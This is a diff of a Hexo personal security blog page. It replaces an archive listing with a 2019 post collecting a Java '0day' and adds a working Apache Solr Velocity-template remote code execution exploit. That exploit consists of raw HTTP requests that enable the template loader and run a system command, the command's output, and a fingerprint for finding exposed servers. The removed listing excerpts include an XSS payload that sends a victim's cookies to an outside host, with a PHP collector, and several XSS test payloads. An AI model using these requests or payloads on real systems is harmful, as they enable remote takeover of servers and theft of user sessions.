@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>阿杰的小站</title>
+    <title>java 0day整理 · 阿杰的小站</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >阿杰的小站</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">java 0day整理</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>阿杰的小站</a>
 </header>
@@ -220,24 +231,74 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            java 0day整理
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">244</span>Reading time: <span class="post-count reading-time">1 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/10/31</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,329 +399,49 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/08/11/python中byte、str和bytearray相互转换/" >
-            
-                <span>python中byte、str和bytearray相互转换</span>
-        </a>
-        <div class="abstract-content">
-            三者用途首先str是采用Unicode编码方式的序列，主要用于显示。而bytes是字节序列，主要用于网络和文件传输。bytearray和bytes是一样的，只是它是可变的，它们的关系和str与list类似。在aes解密或者网络数据中，数据应该是bytes或bytearray。
-str 和 bytestr = &#39;asdf&#39;.encode(&#39;utf-8&#39;)byte = b&#39;asdf&#39;.decode(&#39;utf-8&#39;)
-byte 和 byetearraybyte = bytearray(b&#39;asdf&#39;)byte = ...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/11</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/08/06/De1CTF SSRF ME/" >
-            
-                <span>De1CTF SSRF ME</span>
-        </a>
-        <div class="abstract-content">
-            SSRF ME考点：哈希长度扩展攻击+flask题目直接给出源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110#! /usr/bin/env python#encoding=utf-8from f...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/06</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/07/28/XSS练习靶场/" >
-            
-                <span>XSS练习靶场</span>
-        </a>
-        <div class="abstract-content">
-            一、DVWA1.DOMlow：&lt;script&gt;alert(1)&lt;/script&gt;medium：&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt;注意有的要包裹前面的high：English#&lt;script&gt;alert(1)&lt;/script&gt;服务器端过滤的是GET的参数，而前端js使用的是整个url，可以通过#隔开插入js语句
-2.stored和reflect&lt;img src=1 onerror=alert(1)&gt;通关所有
-二、XSS靶场level1：h...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/28</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/07/28/制作windows小脚本/" >
-            
-                <span>制作windows小脚本</span>
-        </a>
-        <div class="abstract-content">
-            bat可以创建一个文件，后缀名改为.bat，编辑内容为cmd指令，就可以当做一个脚本来执行了如：12ping www.baidu.comping www.sina.com
-vbs执行bat脚本如何隐藏，cmd窗口呢，可以通过vbs脚本来打开将一下代码保存为.vbs文件，运行该文件即可12Set ws = CreateObject(&quot;Wscript.Shell&quot;)ws.run &quot;cmd /c htmer.bat&quot;,vbhide
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="solr模板命令执行"><a href="#solr模板命令执行" class="headerlink" title="solr模板命令执行"></a>solr模板命令执行</h2><p>1、先添加一个collection，比如test<br>2、然后发送两个数据包，第二个数据包最好自己get访问<br>正常成功返回都是200<br>指纹：80.http.get.body: “Solr Query Syntax”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Apache Solr RCE via Velocity template</span><br><span class="line"></span><br><span class="line">Set &quot;params.resource.loader.enabled&quot; as true.</span><br><span class="line"></span><br><span class="line">Request:</span><br><span class="line">========================================================================</span><br><span class="line">POST /solr/test/config HTTP/1.1</span><br><span class="line">Host: solr:8983</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">========================================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RCE via velocity template</span><br><span class="line">Request:</span><br><span class="line">========================================================================</span><br><span class="line">GET /solr/test/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1</span><br><span class="line">Host: localhost:8983</span><br><span class="line">========================================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Response:</span><br><span class="line">========================================================================</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html;charset=utf-8</span><br><span class="line">Content-Length: 56</span><br><span class="line"></span><br><span class="line">     0  uid=8983(solr) gid=8983(solr) groups=8983(solr)</span><br><span class="line">========================================================================</span><br></pre></td></tr></table></figure></p>
 
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/28</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
-    
-</div>
-            
-        </div>
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/07/22/任意用户密码重置/" >
-            
-                <span>任意用户密码重置</span>
-        </a>
-        <div class="abstract-content">
-            任意用户密码重置1.案例1.百度某站任意用户密码重置http://www.anquan.us/static/bugs/wooyun-2016-0207468.html（1）抓重置密码数据包（2）查看数据包中的token（3）查看url中标识身份的数据段（4）发现token与url数据段是一致！！（5）通过使用token构造url进行密码重置2.米鼠网任意用户密码重置http://www.anquan.us/static/bugs/wooyun-2016-0211505.html（1）访问密码找回页面（2）随便输名字burp抓包（3）查看到手机号在请求包和源    代码中（4）查看源代码（...
+        <div class="license-wrapper">
+            <p>Author：<a href="http://yoursite.com">Kage</a>
+            <p>原文链接：<a href="http://yoursite.com/2019/10/31/java 0day整理/">http://yoursite.com/2019/10/31/java 0day整理/</a>
+            <p>发表日期：<a href="http://yoursite.com/2019/10/31/java 0day整理/">十月 31日 2019, 10:19:03 晚上</a>
+            <p>更新日期：<a href="http://yoursite.com/2019/10/31/java 0day整理/">October 31st 2019, 10:19:03 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/22</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/07/22/XSS利用/" >
-            
-                <span>XSS利用</span>
-        </a>
-        <div class="abstract-content">
-            窃取cookieget.js1document.createElement(&apos;img&apos;).src=&apos;http://192.168.138.1:8001/get.php?cookie=&apos; + document.cookie + &apos;&gt;&apos;
-get.php12345$text = file_get_contents(&quot;./cookie.txt&quot;);$text = $text . &quot;\n&quot; . $_GET[&apos;cookie&apos;];file_put_contents(&quot;...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/22</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/07/20/python脚本-自动上传到hexo/" >
-            
-                <span>python脚本-自动上传到hexo</span>
-        </a>
-        <div class="abstract-content">
-            一、压缩与解压导入相应模块1234import osimport shutilimport zipfilefrom os.path import join, getsize
-1. python压缩指定文件夹12345678910def zip_file(src_dir):    zip_name = src_dir +&apos;.zip&apos;    z = zipfile.ZipFile(zip_name,&apos;w&apos;,zipfile.ZIP_DEFLATED)    for dirpath, dirnames, filenames in os.walk(src_d...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/20</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/07/20/PHP XXE/" >
-            
-                <span>PHP XXE</span>
-        </a>
-        <div class="abstract-content">
-            xml是什么XML指可扩展标记语言用处：被设计用来传输和存储数据。与HTML区别：HTML是被设计用来显示数据，HTML具有特效，XML用来传输数据XML 标签没有被预定义。需要自行定义标签XML 被设计为具有自我描述性
-一个XML文档实例第一行是xml声明，定义版本和使用编码第二行是根元素，一个xml文档必须拥有根元素其下几行是子元素1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;note&gt;&lt;to&gt;George&lt;/to&gt;&lt;from&gt;John&l...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/20</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/06/13/Sqli-labs 盲注脚本编写/" >
-            
-                <span>Sqli-labs 盲注脚本编写</span>
-        </a>
-        <div class="abstract-content">
-            二分法1.初始化设置数组范围，猜英文字符通常32~127，猜表长度通常502.当low&lt;=high进入循环计算mid值，需要换算成整型当所猜数小于midhigh指针左移为mid-1当所猜数大于midlow指针左移位mid+1当low&gt;high时输出list[high]则为最终结果
-编写1.思路构造payload：所猜数&lt;mid判断条件，字符串如果在html中，那么就左移位，反之右移位2.编写先获得数据长度值，在根据长度获取具体值我是编写两个函数一个函数用来二分法求值，可求长度，或单个字符第二个函数用来整合获取数据，循环每位字符得到字符串
-注意python进行%赋值时，需...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/06/13</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Web">Web</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/05/21/Beautifulsoup解析/" >
-            
-                <span>BeautifulSoup解析</span>
-        </a>
-        <div class="abstract-content">
-            概念一个节点可以由5个部分来概括
-
-节点名
-节点内容
-子节点
-父亲节点
-属性
-
-所以我们主要围绕两个问题：
-
-如何获得相应节点
-如何从该节点获得我们需要的信息
-
-获得节点soup.p：获得第一个p标签节点soup.find_all(&quot;p&quot;)：获得所有p标签节点组成的listsoup.find(id=&quot;link3&quot;)：通过id选择器获得指定节点
-获得信息soup.p.name：获得节点名soup.p.text：获得节点文字内容包含子节点soup.p.string：获得节点文字内容soup.p[&quot;class&quot;]：获得属性内容soup...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/05/21</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "编程">编程</a>
-    
-</div>
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/10/24/Thinkcmf批量搜漏洞并提交到漏洞平台/" title= "Thinkcmf批量搜漏洞并提交到漏洞平台">
+                    <div class="prevTitle">Thinkcmf批量搜漏洞并提交到漏洞平台</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
-    <nav class="page-nav">
-        <a class="extend prev" rel="prev" href="/archives/page/3/">&#60; PREV</a><a class="page-number" href="/archives/">1</a><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/archives/page/5/">5</a><a class="extend next" rel="next" href="/archives/page/5/">NEXT &#62;</a>
-    </nav>
     
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -742,6 +523,24 @@ get.php12345$text = file_get_contents(&quot;./cookie.txt&quot;);$text = $text . 
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#solr模板命令执行"><span class="toc-number">1.</span> <span class="toc-text">solr模板命令执行</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1803,6 +1602,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
